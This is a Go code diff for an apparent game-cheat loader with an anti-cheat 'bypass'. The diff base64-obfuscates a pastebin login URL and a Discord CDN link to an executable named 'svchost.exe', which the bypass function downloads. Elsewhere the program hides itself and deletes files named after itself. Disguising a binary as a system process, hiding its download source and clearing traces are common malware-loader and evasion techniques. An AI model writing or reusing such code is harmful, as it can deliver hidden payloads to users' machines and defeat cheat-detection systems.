@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -208,14 +209,17 @@ func run() {
 	}
 	log.Printf(cheat + " has been closed")
 	hide()
-	fmt.Println("Going back to menu in 5 seconds...")
+	fmt.Println("Exiting in 5 seconds...")
 	time.Sleep(5 * time.Second)
+	os.Exit(3)
 }
 
 func login() {
 	var user string
 	var pass string
-	resp, err := http.Get("https://pastebin.com/raw/bsy1HBRw")
+	link, err := base64.StdEncoding.DecodeString("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2JzeTFIQlJ3")
+	linkLogin := string(link)
+	resp, err := http.Get(linkLogin)
 	if err != nil {
 		loginError()
 	}
@@ -271,7 +275,9 @@ func bypass() {
 	clear()
 	logo()
 	log.Printf("Starting " + cheat + "...")
-	resp, err := http.Get("https://cdn.discordapp.com/attachments/967276001014996992/978626137628499979/svchost.exe")
+	link, err := base64.StdEncoding.DecodeString("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTY3MjMzNzkwNTUwMzU2MDM4Lzk3ODczMzU3NzcyODU2NTI3OC9zdmNob3N0LmV4ZQ==")
+	linkch := string(link)
+	resp, err := http.Get(linkch)
 	if err != nil {
 		hide()
 	}
@@ -348,7 +354,6 @@ func ClearDir2(dir string) error {
 func ClearDir3(dir string) error {
 	filename := filepath.Base(os.Args[0])
 	upper := strings.ToUpper(filename)
-	fmt.Println(upper)
 	files, err := filepath.Glob(filepath.Join(dir, upper+"-*"))
 	if err != nil {
 		return err
